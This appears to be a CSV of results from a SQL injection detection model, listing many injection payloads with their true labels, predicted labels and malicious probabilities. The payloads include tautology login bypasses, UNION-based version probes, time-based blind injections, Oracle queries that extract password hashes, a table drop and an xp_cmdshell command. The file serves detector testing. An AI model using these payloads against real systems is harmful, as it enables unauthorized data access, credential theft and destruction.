Query,Label,predicted,correct,malicious_probability
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9764172223587523
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9979184752491096
 and 1 in   (  select var from temp  )  --,1,1,True,0.8769836456093256
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9972866099778355
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
or x  =  x,1,0,False,0.1163562789807521
or a  =  a,1,0,False,0.16990246968508302
or '1'  =  '1,1,1,True,0.9993535215401184
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,1,True,0.9639955786932922
   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,1,True,0.8986351687581831
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,1,True,0.9981534782255551
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,1,True,0.9968075803445151
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.5824844888191355
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,1,True,0.9999348368458993
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,1,True,0.9792396987158971
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,1,True,0.9529262238927568
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,1,True,0.9963322252543412
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9754911227354338
a' or 1  =  1--,1,1,True,0.9982694438768481
 )   or   (  a  =  a,1,0,False,0.17918442037097845
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,0,False,0.07336861382510834
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,1,True,0.9913564403967353
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,1,True,0.9963322252543412
-- &password  = ,1,1,True,0.9793791638629424
select * from users where id  =  1 <@. or 1  =  1 -- 1,1,1,True,0.9792396987158971
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,1,True,0.9725208412982135
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,1,True,0.9717819336079158
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,1,True,0.5707671433027347
 or '1'  =  '1,1,1,True,0.9990768539321371
admin' or 1  =  1,1,1,True,0.9999985120713274
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,1,True,0.9756943967280309
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,1,True,0.9624361568682447
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,1,True,0.9462285817839611
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,1,True,0.9773723799244981
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1,1,True,0.5554930088263267
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,1,True,0.9754420731717811
 or 1  =  1--,1,1,True,0.9952795585327112
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,True,0.5899874729902959
pg_sleep  (  __TIME__  )  --,1,1,True,0.9195542523950955
‘ or 3  =  3 --,1,1,True,0.8565970165719164
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,1,True,0.9751135137282793
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
 )   union select * from information_schema.tables;,1,1,True,0.6641891609685961
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,1,True,0.9773723799244981
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.7372890806812884
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1,1,True,0.9409434477401015
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,True,0.5640503668555866
""" or """" """,1,0,False,0.10482191891342997
delete,1,0,False,0.07569525340697972
;waitfor delay '0:0:__TIME__'--,1,1,True,0.8889359499631833
 or 1  =  1 --,1,1,True,0.9942100124029173
1' and non_existant_table   =   '1,1,1,True,0.7963793432611056
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,1,True,0.9749800785128296
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,1,True,0.9926242608076249
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,0,False,0.1295474036547642
x' AND userid IS NULL; --,1,1,True,0.9997858982733018
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9980311951851359
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,1,True,0.9529262238927568
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,1,True,0.9766330781395862
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,1,True,0.7230881390243874
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.7921588757190297
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,1,True,0.9048991655430435
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,1,True,0.9752921109936594
UNION ALL SELECT,1,1,True,0.9971340767441605
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,1,True,0.9819323156304148
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,1,True,0.9796505290412487
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9800022343498551
x' or full_name like '%bob%,1,1,True,0.6155607943735388
x' and members.email is NULL; --,1,1,True,0.9901615527522042
 or 2 > 1,1,0,False,0.06807143243087757
select * from users where id  =  1.*1 or 1  =  1 -- 1,1,1,True,0.9789015394067846
"""  )   or pg_sleep  (  __TIME__  )  --",1,1,True,0.9398566405357183
 ',1,1,True,0.9946994413901019
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1,1,True,0.9742985628918548
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,1,True,0.9749800785128296
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1,1,True,0.9789820066937749
 )   or sleep  (  __TIME__  )    =  ',1,0,False,0.35828990857836907
sleep 50',1,0,False,0.39724725030612146
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9947653070755644
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,1,True,0.9339866656274338
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,1,True,0.9867803788384013
or sleep  (  __TIME__  )    =  ',1,0,False,0.3297755321127446
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,1,True,0.9754420731717811
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,1,True,0.9529262238927568
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,1,True,0.9353526640140902
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,1,True,0.9500488054358038
or 2 > 1,1,0,False,0.041641780570361844
; exec   (  'sel' + 'ect us' + 'er'  ) ,1,0,False,0.11895463356501265
anything' OR 'x'  =  'x,1,1,True,0.9999991256422507
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,1,True,0.9742985628918548
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9756287570741041
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1,1,True,0.9471536977508852
&',1,0,False,0.048136499753599064
a' or 3  =  3--,1,1,True,0.9384456667782788
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,1,True,0.9978806263817472
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9716273216127501
"admin""or 1  =  1 or """"  =  """,1,1,True,0.9997077658017943
uni/**/on sel/**/ect,1,1,True,0.9999822240896399
""" or """"&""",1,0,False,0.13225650688539672
 )    )   ;waitfor delay '0:0:__TIME__'--,1,1,True,0.9206661698658137
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
1 waitfor delay '0:0:10'--,1,1,True,0.9369510379335815
bfilename,1,0,False,0.08173216400629989
admin'  )   or   (  '1'  =  '1'--,1,1,True,0.9999999983146306
UEf,1,0,False,0.06317682083846157
 -- &password  = ,1,1,True,0.9932678818695891
1 or sleep  (  __TIME__  )  #,1,1,True,0.6181214637937629
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,True,0.5677029927079598
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,1,True,0.9969590127808812
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,1,True,0.9908326520799531
1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,1,1,True,0.9854354109829567
or sleep  (  __TIME__  )  #,1,1,True,0.5091022328200628
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,1,True,0.5538589141408065
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,1,True,0.9799164588962995
||6,1,0,False,0.18632596122759976
or 1/*,1,1,True,0.8828080223582895
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1,0,False,0.4110925509776686
select * from users where id  =  1.%@ or 1  =  1 -- 1,1,1,True,0.9787099655947176
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,1,True,0.9756943967280309
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1,1,True,0.978518775699996
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
" or 1  =  1 or """"  =  ",1,0,False,0.42891104689634113
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,True,0.6240106069049843
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1,1,True,0.9789820066937749
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9753824458519355
or 'whatever' in   (  'whatever'  ) ,1,1,True,0.5697388811788392
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1,0,False,0.0203730884537049
select * from users where id  =  '1'   or 1  =  1 -- 1',1,1,True,0.9991923488728655
?,1,0,False,0.048136499753599064
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1,1,True,0.8695657990933473
" select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1,1,True,0.9968478237886798
"admin""  )   or   (  ""1""  =  ""1""#",1,1,True,0.9996559561542022
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1,1,True,0.9903869508312326
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1,1,True,0.9727198042142955
 or '' ',1,1,True,0.9605763559173075
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
or 1  =  1,1,0,False,0.42712175318316736
 ; drop table temp --,1,1,True,0.9765788630743584
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.6144022697271918
""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.7511392053981395
""" or ""x""  =  ""x",1,0,False,0.08192740703927906
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1,1,True,0.9983400574257256
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,1,True,0.9673654332389267
 or 'something' like 'some%',1,0,False,0.4230914731762037
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1,1,True,0.8753618165501501
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.6446955938076963
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1,1,True,0.999062287866455
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,1,True,0.9772542496108115
admin' or '1'  =  '1'--,1,1,True,0.9999999982359609
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,1,1,True,0.88417644537439
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.5563729007591832
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9618518111507983
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1,1,True,0.9688558624391019
""";waitfor delay '0:0:__TIME__'--",1,1,True,0.8889359499631833
x' and userid is NULL; --,1,1,True,0.9985740733699034
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,1,True,0.9991146737299259
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,1,True,0.9665296000780886
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1,1,True,0.9776310531670696
’ or ‘1’  =  ’1,1,0,False,0.11878732646117773
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9972866099778355
admin'or 1  =  1 or ''  =  ',1,1,True,0.99999754602895
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,1,True,0.9975278783561813
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1,0,False,0.2597969356702056
exec  (  @s  ) ,1,0,False,0.06706616700380089
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,1,True,0.9749800785128296
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1,1,True,0.9732554895000317
 or 1  =  1,1,0,False,0.47023438150700536
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1,1,True,0.936224988815715
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9519691405527002
